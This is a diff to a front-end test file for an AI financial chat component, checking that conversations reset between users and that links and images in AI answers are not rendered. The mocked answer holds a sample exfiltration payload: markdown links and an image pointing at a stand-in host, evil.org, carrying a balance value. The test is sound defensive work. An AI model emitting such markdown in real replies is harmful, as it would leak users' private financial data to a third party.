@@ -136,10 +136,10 @@ describe('critical function invocation boundaries (mocked, not backend authoriza
     expect(screen.getByRole('button',{name:'Send question'}).disabled).toBe(true);
   });
   it('resets conversations between users and suppresses AI image/link exfiltration', async () => {
-    sdk.functions.invoke.mockResolvedValue({data:{answer:'[Balance](https://evil.org/?balance=100) ![track](https://evil.org/image) **$100**'}});
+    sdk.functions.invoke.mockResolvedValue({data:{answer:'[Balance](https://evil.org/?balance=100) ![track](https://evil.org/image) **$100**\n\n- Review the saved electricity bill\n- Confirm your income\n\n1. Open Bills & Budget\n2. Review the amount'}});
     const view=render(<AskAveraConversation />);
     fireEvent.change(screen.getByLabelText('Ask Avera'),{target:{value:'Private question'}});fireEvent.click(screen.getByRole('button',{name:'Send question'}));
-    await screen.findByText('$100');expect(screen.queryByRole('link')).toBeNull();expect(screen.queryByRole('img')).toBeNull();
+    await screen.findByText('$100');expect(screen.getByText(/AI can make mistakes/)).toBeTruthy();expect(screen.getAllByRole('list')).toHaveLength(2);expect(screen.getAllByRole('listitem')).toHaveLength(4);expect(screen.queryByRole('link')).toBeNull();expect(screen.queryByRole('img')).toBeNull();
     sdk.user={id:'b'};view.rerender(<AskAveraConversation />);
     expect(screen.queryByText('Private question')).toBeNull();expect(screen.queryByText('$100')).toBeNull();
   });
